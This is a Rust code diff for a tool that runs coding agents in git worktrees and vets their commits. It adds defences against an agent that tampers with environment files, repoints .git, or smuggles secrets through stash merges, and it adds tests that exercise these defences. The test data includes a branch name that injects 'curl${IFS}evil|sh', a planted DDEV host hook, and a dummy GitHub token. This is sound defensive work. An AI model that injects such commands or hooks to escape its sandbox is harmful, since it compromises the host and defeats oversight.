@@ -212,8 +212,23 @@ pub async fn run(ctx: &Ctx, id: i64) -> Result<()> {
         me: &me,
         pack_prompts: &pack_prompts,
     })?;
+    // Teardown and cleanup run outside the sandbox on files the agent can edit (.ddev, compose
+    // files, Makefile): keep a copy from before the agent and put it back before they run.
+    let snapshot = job_dir.join("env-snapshot");
+    let guard_env = !(s.env.teardown.is_empty() && s.env.cleanup.is_empty());
+    if guard_env {
+        snapshot_env(&wt, &snapshot)?;
+    }
     log(ctx, id, &format!("running {} ({step})", s.agent.label()));
     let outcome = agent::run(s.agent, &s, &wt, &job_dir, &prompt, read_only_verb(verb)).await;
+    // Before anything runs in the worktree again, even on failure: did the agent repoint .git?
+    if let Err(e) = git::verify_gitfile(&wt, &gitfile) {
+        let _ = std::fs::remove_dir_all(&wt);
+        return Err(e.context("env teardown skipped and the worktree removed"));
+    }
+    if guard_env {
+        restore_env(&wt, &snapshot)?;
+    }
     for c in &s.env.teardown {
         if let Err(e) = sh(&wt, &job_dir, &vars.apply(c), &s).await {
             log(ctx, id, &format!("env teardown `{c}` failed: {e:#}"));
@@ -230,19 +245,15 @@ pub async fn run(ctx: &Ctx, id: i64) -> Result<()> {
     let (b, a) = (j.head_before.clone(), j.head_after.clone());
     let range = format!("{b}..{a}");
     let commits: usize = git(&clone, &["rev-list", "--count", &range]).await?.parse().unwrap_or(0);
-    const RAW: [&str; 4] = ["--no-color", "--no-ext-diff", "--no-textconv", "--text"];
-    let d = Diff {
-        files: checks::parse_numstat_z(&git(&clone, &["diff", "--numstat", "-z", "--no-renames", &b, &a]).await?),
-        touched: checks::parse_names_z(&git(&clone, &["log", "--name-only", "-z", "--no-renames", "--format=", &range]).await?),
-        scan: git(&clone, &[&["log", "-p", "-U0", "--format=%B"][..], &RAW, &[&range]].concat()).await?,
-        fast_forward: git::is_ancestor(&clone, &b, &a).await,
-    };
+    let d = collect_diff(&clone, &b, &a).await?;
+    const RAW: [&str; 4] = RAW_DIFF;
     let patch = git(&clone, &[&["diff"][..], &RAW, &[&b, &a]].concat()).await?;
     if !git(&wt, &["status", "--porcelain"]).await?.is_empty() {
         log(ctx, id, "agent left uncommitted changes; they are not pushed");
     }
-    let gl = gitleaks(&clone, &range, &job_dir).await;
-    let reply_texts: Vec<&str> = outcome.replies.iter().map(|r| r.body.as_str()).collect();
+    let gl = gitleaks(&d.added_text(), &job_dir).await;
+    // The summary becomes a draft PR title/body for issue fixes: scan it like a reply.
+    let reply_texts: Vec<&str> = outcome.replies.iter().map(|r| r.body.as_str()).chain([outcome.summary.as_str()]).collect();
     let mut results = checks::run(&s.checks, &d, gl.as_deref(), &reply_texts);
     // Pack pre-push gates can only add failures.
     if commits > 0 {
@@ -260,6 +271,9 @@ pub async fn run(ctx: &Ctx, id: i64) -> Result<()> {
                 Some("needs_approval") => results.push(CheckResult { name, ok: false, blocking: false, detail: o.summary }),
                 _ => {}
             }
+        }
+        if guard_env {
+            restore_env(&wt, &snapshot)?;
         }
     }
     j.checks = results;
@@ -383,7 +397,12 @@ pub fn manual_commands(j: &Job) -> String {
         return String::new();
     }
     // From the clone, by SHA: the worktree may have been reused or cleaned up since.
-    format!("git -C {} push {} {}:refs/heads/{}", shell_quote(&j.meta.clone), shell_quote(&j.meta.push_url), j.head_after, j.meta.push_ref)
+    push_command(&j.meta.clone, &j.meta.push_url, &j.head_after, &j.meta.push_ref)
+}
+
+/// The branch name can come from a fork's author: every part is quoted.
+fn push_command(clone: &str, url: &str, sha: &str, branch: &str) -> String {
+    format!("git -C {} push {} {}", shell_quote(clone), shell_quote(url), shell_quote(&format!("{sha}:refs/heads/{branch}")))
 }
 
 fn shell_quote(s: &str) -> String {
@@ -427,7 +446,9 @@ pub async fn gc(ctx: &Ctx, all: bool) -> Result<()> {
             };
         if all || old || closed {
             let s = cfg.settings_for(&ctx.paths, &j.repo).ok();
-            if let Some(s) = &s {
+            let snap = ctx.paths.job_dir(j.id).join("env-snapshot");
+            let restored = !snap.exists() || restore_env(&wt, &snap).is_ok();
+            if let Some(s) = s.as_ref().filter(|_| restored) {
                 let vars = Vars { repo: &j.repo.path, n: j.number, forge: j.repo.forge.as_str(), wt: &wt, branch: &j.branch };
                 for c in &s.env.cleanup {
                     let _ = sh(&wt, &ctx.paths.job_dir(j.id), &vars.apply(c), s).await;
@@ -467,7 +488,7 @@ async fn sh(wt: &Path, job_dir: &Path, cmd: &str, s: &RepoSettings) -> Result<()
         .args(["-c", cmd])
         .current_dir(wt)
         .env_clear()
-        .envs(agent::agent_env(job_dir))
+        .envs(agent::hook_env(job_dir))
         .kill_on_drop(true)
         .stdin(std::process::Stdio::null())
         .output();
@@ -477,6 +498,87 @@ async fn sh(wt: &Path, job_dir: &Path, cmd: &str, s: &RepoSettings) -> Result<()
         bail!("exit {}: {}", out.status, String::from_utf8_lossy(&out.stderr).lines().last().unwrap_or_default());
     }
     Ok(())
+}
+
+/// Paths env commands typically read: DDEV and devcontainer config, compose files, make/just.
+fn env_paths(wt: &Path) -> Vec<String> {
+    let mut v = vec![".ddev".to_string(), ".devcontainer".to_string()];
+    for e in std::fs::read_dir(wt).into_iter().flatten().flatten() {
+        let n = e.file_name().to_string_lossy().to_string();
+        let compose = (n.starts_with("docker-compose") || n.starts_with("compose")) && (n.ends_with(".yml") || n.ends_with(".yaml"));
+        if compose || matches!(n.as_str(), "Makefile" | "makefile" | "GNUmakefile" | "justfile" | ".env") {
+            v.push(n);
+        }
+    }
+    v
+}
+
+pub(crate) fn snapshot_env(wt: &Path, snap: &Path) -> Result<()> {
+    if snap.exists() {
+        std::fs::remove_dir_all(snap)?;
+    }
+    std::fs::create_dir_all(snap)?;
+    for n in env_paths(wt) {
+        if std::fs::symlink_metadata(wt.join(&n)).is_ok() {
+            copy_tree(&wt.join(&n), &snap.join(&n))?;
+        }
+    }
+    Ok(())
+}
+
+/// Put env files back exactly as snapshotted: changed ones restored, new ones removed.
+pub(crate) fn restore_env(wt: &Path, snap: &Path) -> Result<()> {
+    for n in env_paths(wt) {
+        let p = wt.join(&n);
+        match std::fs::symlink_metadata(&p) {
+            Ok(m) if m.is_dir() => std::fs::remove_dir_all(&p)?,
+            Ok(_) => std::fs::remove_file(&p)?,
+            Err(_) => {}
+        }
+    }
+    for e in std::fs::read_dir(snap)?.flatten() {
+        copy_tree(&e.path(), &wt.join(e.file_name()))?;
+    }
+    Ok(())
+}
+
+/// Copy files, dirs and symlinks (as links, never followed). Skips DDEV's database snapshots.
+fn copy_tree(from: &Path, to: &Path) -> Result<()> {
+    let m = std::fs::symlink_metadata(from)?;
+    if m.file_type().is_symlink() {
+        #[cfg(unix)]
+        std::os::unix::fs::symlink(std::fs::read_link(from)?, to)?;
+    } else if m.is_dir() {
+        std::fs::create_dir_all(to)?;
+        for e in std::fs::read_dir(from)?.flatten() {
+            if e.file_name() != "db_snapshots" {
+                copy_tree(&e.path(), &to.join(e.file_name()))?;
+            }
+        }
+    } else {
+        std::fs::copy(from, to)?;
+    }
+    Ok(())
+}
+
+const RAW_DIFF: [&str; 4] = ["--no-color", "--no-ext-diff", "--no-textconv", "--text"];
+
+/// Everything the pre-push checks look at for `b..a`, read from the clone on fixed SHAs.
+async fn collect_diff(clone: &Path, b: &str, a: &str) -> Result<Diff> {
+    const RAW: [&str; 4] = RAW_DIFF;
+    let range = format!("{b}..{a}");
+    Ok(Diff {
+        files: checks::parse_numstat_z(&git(clone, &["diff", "--numstat", "-z", "--no-renames", b, a]).await?),
+        // `--diff-merges=dense-combined`: a merge commit's own changes (what neither parent had)
+        // are listed and scanned too, so content can't be smuggled in via `git stash` + merge.
+        touched: checks::parse_names_z(
+            &git(clone, &["log", "--name-only", "-z", "--no-renames", "--diff-merges=dense-combined", "--format=", &range]).await?,
+        ),
+        // Messages are indented one space so a message line starting with `-` is still scanned.
+        scan: git(clone, &[&["log", "-p", "-U0", "--diff-merges=dense-combined", "--format=%w(0,1,1)%B"][..], &RAW, &[&range]].concat())
+            .await?,
+        fast_forward: git::is_ancestor(clone, b, a).await,
+    })
 }
 
 async fn default_branch(clone: &Path, url: &str) -> Result<String> {
@@ -515,16 +617,24 @@ async fn changed_build_files(clone: &Path, url: &str, base: &str, head: &str) ->
 }
 
 /// Runs against the user's clone (its own `.gitleaks.toml`, not one the agent could write).
-async fn gitleaks(clone: &Path, range: &str, job_dir: &Path) -> Option<String> {
+/// gitleaks over exactly the text the built-in check scans (added lines, merge resolutions,
+/// messages). `gitleaks git` on the range misses what a merge commit itself adds.
+async fn gitleaks(text: &str, job_dir: &Path) -> Option<String> {
+    use tokio::io::AsyncWriteExt;
     let report = job_dir.join("gitleaks.json");
-    let out = tokio::process::Command::new("gitleaks")
-        .args(["detect", "--no-banner", "--redact", "--exit-code", "0", "--report-format", "json", "--log-opts", range, "--source"])
-        .arg(clone)
-        .arg("--report-path")
+    let mut child = tokio::process::Command::new("gitleaks")
+        .args(["stdin", "--no-banner", "--redact", "--exit-code", "0", "--report-format", "json", "--report-path"])
         .arg(&report)
-        .output()
-        .await
+        .stdin(std::process::Stdio::piped())
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .kill_on_drop(true)
+        .spawn()
         .ok()?;
+    let mut stdin = child.stdin.take()?;
+    stdin.write_all(text.as_bytes()).await.ok()?;
+    drop(stdin);
+    let out = child.wait_with_output().await.ok()?;
     if !out.status.success() {
         return None;
     }
@@ -532,7 +642,7 @@ async fn gitleaks(clone: &Path, range: &str, job_dir: &Path) -> Option<String> {
     let findings: Vec<String> = v
         .as_array()?
         .iter()
-        .map(|f| format!("{} in {}:{}", f["RuleID"].as_str().unwrap_or("?"), f["File"].as_str().unwrap_or("?"), f["StartLine"]))
+        .map(|f| format!("{} (line {} of the scanned changes)", f["RuleID"].as_str().unwrap_or("?"), f["StartLine"]))
         .collect();
     Some(findings.join("\n"))
 }
@@ -575,6 +685,72 @@ fn first_line(s: &str) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    fn git_in(dir: &Path, args: &[&str]) {
+        let o = std::process::Command::new("git")
+            .args(["-c", "user.name=t", "-c", "user.email=t@t", "-c", "commit.gpgsign=false"])
+            .args(args)
+            .current_dir(dir)
+            .output()
+            .unwrap();
+        assert!(o.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&o.stderr));
+    }
+
+    #[tokio::test]
+    async fn secrets_in_stash_merges_and_dash_messages_are_scanned() {
+        let d = tempfile::tempdir().unwrap();
+        crate::git::tests::repo(d.path());
+        let head = |d: &Path| crate::git::tests_head(d);
+        let b = head(d.path());
+        // A secret smuggled in via `git stash` + merging the stash commit.
+        std::fs::write(d.path().join("a.txt"), "a\ntok = ghp_Zq3x9TbW2mK8vLp4Rn7Yc1Hd6Fs0Ja5Ue2Qo\n").unwrap();
+        git_in(d.path(), &["stash", "-q"]);
+        git_in(d.path(), &["merge", "-q", "--ff", "refs/stash"]);
+        let a = head(d.path());
+        let diff = collect_diff(d.path(), &b, &a).await.unwrap();
+        assert!(diff.touched.iter().any(|p| p == "a.txt"), "merge-added file must count as touched: {:?}", diff.touched);
+        let r = checks::run(&crate::config::Checks::default(), &diff, None, &[]);
+        assert!(r.iter().any(|c| c.name == "secrets" && !c.ok), "stash-merge secret must be caught: {r:?}");
+
+        // A commit message line starting with `-`.
+        let b = a;
+        git_in(d.path(), &["commit", "-q", "--allow-empty", "-m", "fix\n\n- tok ghp_Zq3x9TbW2mK8vLp4Rn7Yc1Hd6Fs0Ja5Ue2Qo"]);
+        let a = head(d.path());
+        let diff = collect_diff(d.path(), &b, &a).await.unwrap();
+        let r = checks::run(&crate::config::Checks::default(), &diff, None, &[]);
+        assert!(r.iter().any(|c| c.name == "secrets" && !c.ok), "dash-prefixed message line must be scanned: {r:?}");
+    }
+
+    #[test]
+    fn env_files_are_restored_before_teardown() {
+        let d = tempfile::tempdir().unwrap();
+        let (wt, snap) = (d.path().join("wt"), d.path().join("snap"));
+        std::fs::create_dir_all(wt.join(".ddev")).unwrap();
+        std::fs::write(wt.join(".ddev/config.yaml"), "name: ok\n").unwrap();
+        std::fs::write(wt.join("compose.yaml"), "services: {}\n").unwrap();
+        std::fs::write(wt.join("src.rs"), "fn main() {}\n").unwrap();
+        snapshot_env(&wt, &snap).unwrap();
+
+        // The agent edits env config and adds new files that a teardown would pick up.
+        std::fs::write(wt.join(".ddev/config.yaml"), "hooks: {pre-stop: [{exec-host: evil}]}\n").unwrap();
+        std::fs::write(wt.join(".ddev/docker-compose.evil.yaml"), "x").unwrap();
+        std::fs::write(wt.join("docker-compose.override.yml"), "x").unwrap();
+        std::fs::write(wt.join("src.rs"), "fn main() { changed() }\n").unwrap();
+        restore_env(&wt, &snap).unwrap();
+
+        assert_eq!(std::fs::read_to_string(wt.join(".ddev/config.yaml")).unwrap(), "name: ok\n");
+        assert!(!wt.join(".ddev/docker-compose.evil.yaml").exists());
+        assert!(!wt.join("docker-compose.override.yml").exists());
+        assert_eq!(std::fs::read_to_string(wt.join("compose.yaml")).unwrap(), "services: {}\n");
+        // Only env files are touched: the agent's real work stays.
+        assert_eq!(std::fs::read_to_string(wt.join("src.rs")).unwrap(), "fn main() { changed() }\n");
+    }
+
+    #[test]
+    fn manual_push_command_quotes_fork_branch() {
+        let cmd = push_command("/c", "git@github.com:o/r.git", &"b".repeat(40), "a;curl${IFS}evil|sh");
+        assert!(cmd.ends_with(&format!("'{}:refs/heads/a;curl${{IFS}}evil|sh'", "b".repeat(40))), "{cmd}");
+    }
 
     #[test]
     fn vars_template() {
